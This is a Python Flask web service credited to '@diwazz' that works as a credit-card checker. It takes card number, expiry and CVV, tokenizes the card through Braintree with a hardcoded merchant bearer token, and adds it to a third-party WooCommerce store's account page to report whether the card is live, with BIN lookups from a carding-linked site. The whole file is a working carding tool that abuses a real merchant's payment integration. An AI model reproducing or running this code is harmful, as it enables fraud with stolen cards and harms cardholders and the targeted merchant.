from flask import Flask, request, jsonify
import requests
import re
import random
import string
import os

app = Flask(__name__)

# --- Braintree Auth - By @diwazz
def braintree_full_check(cc, mm, yy, cvv):
    session = requests.Session()
    session.headers.update({
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'
    })

    if len(yy) == 4:
        yy = yy[-2:]

    try:
        #Update This
        graphql_headers = {
            'accept': '*/*',
            'accept-language': 'en-US',
            'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NTk4MjA1NTcsImp0aSI6IjBhOGM5NzMzLTdiOGYtNGNhZi04YTgwLTEyYWVmNjVlM2JkNiIsInN1YiI6Ijg1Zmh2amhocTZqMnhoazgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Ijg1Zmh2amhocTZqMnhoazgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwiT3B0aW9ucyI6e319.EFXSbEp5KFNHR1EUOcn9JAZZyKuztF9gcuanKJvNwKhRczL7E6iwoiOl4e9Li3oVKESOpRyO5qCZ7jsbb1Yyqw',
            'braintree-version': '2018-05-10', 
            'content-type': 'application/json', 
            'origin': 'https://altairtech.io',
        }
        
        graphql_json_data = {
            'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': '9005fad8-c1f4-474a-9777-a0379f6e57a0'},
            'query': 'query ClientConfiguration { clientConfiguration { braintreeApi { accessToken } } }',
            'operationName': 'ClientConfiguration',
        }
        
        graphql_response = session.post('https://payments.braintree-api.com/graphql', headers=graphql_headers, json=graphql_json_data)
        braintree_client_token = graphql_response.json()['data']['clientConfiguration']['braintreeApi']['accessToken']

        # Nonce generation
        nonce_headers = {
            'Accept': 'application/json', 
            'Braintree-Version': '2018-05-10', 
            'Content-Type': 'application/json',
        }
        nonce_data = {
            "creditCard": {"number": cc, "expirationMonth": mm, "expirationYear": yy, "cvv": cvv},
            "_meta": {"integration": "custom", "source": "client"},
            "authorizationFingerprint": braintree_client_token,
        }
        nonce_response = session.post('https://api.braintreegateway.com/merchants/85fhvjhhq6j2xhk8/client_api/v1/payment_methods/credit_cards', json=nonce_data)
        
        if nonce_response.status_code != 201:
            error_message = nonce_response.json().get('error', {}).get('message', 'Card details rejected by Braintree.')
            return {"status": "Declined", "response": error_message}
        
        payment_nonce = nonce_response.json()['creditCards'][0]['nonce']

        # Website integration
        login_page_res = session.get('https://altairtech.io/account/add-payment-method/')
        site_nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', login_page_res.text)
        if not site_nonce_match:
            return {"status": "Declined", "response": "Could not get website nonce."}
        site_nonce = site_nonce_match.group(1)

        site_data = {
            'payment_method': 'braintree_credit_card',
            'wc_braintree_credit_card_payment_nonce': payment_nonce,
            'woocommerce-add-payment-method-nonce': site_nonce,
            'woocommerce_add_payment_method': '1',
        }
        final_response = session.post('https://altairtech.io/account/add-payment-method/', data=site_data)
        
        # Response parsing
        html_text = final_response.text
        pattern = r'Status code\s*([^<]+)\s*</li>'
        match = re.search(pattern, html_text)
        
        if match:
            final_status = match.group(1).strip()
            return {"status": "Declined", "response": final_status}
        elif "Payment method successfully added." in html_text:
            return {"status": "Approved", "response": "Payment method successfully added."}
        else:
            return {"status": "Declined", "response": "Unknown response from website."}

    except Exception as e:
        return {"status": "Declined", "response": f"An unexpected error occurred: {str(e)}"}

def get_bin_info(bin_number):
    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}')
        return response.json() if response.status_code == 200 else {}
    except Exception:
        return {}

@app.route('/')
def home():
    return jsonify({"message": "Braintree Checker API", "status": "active"})

@app.route('/braintree', methods=['GET'])
def braintree_endpoint():
    card_str = request.args.get('card')
    if not card_str:
        return jsonify({"error": "Please provide card details using ?card=..."}), 400

    match = re.match(r'(\d{16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', card_str)
    if not match:
        return jsonify({"error": "Invalid card format. Use CC|MM|YY|CVV."}), 400

    cc, mm, yy, cvv = match.groups()
    check_result = braintree_full_check(cc, mm, yy, cvv)
    bin_info = get_bin_info(cc[:6])

    final_result = {
        "status": check_result["status"],
        "response": check_result["response"],
        "bin_info": {
            "brand": bin_info.get('brand', 'Unknown'), 
            "type": bin_info.get('type', 'Unknown'),
            "country": bin_info.get('country_name', 'Unknown'), 
            "country_flag": bin_info.get('country_flag', ''),
            "bank": bin_info.get('bank', 'Unknown'),
        }
    }
    return jsonify(final_result)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
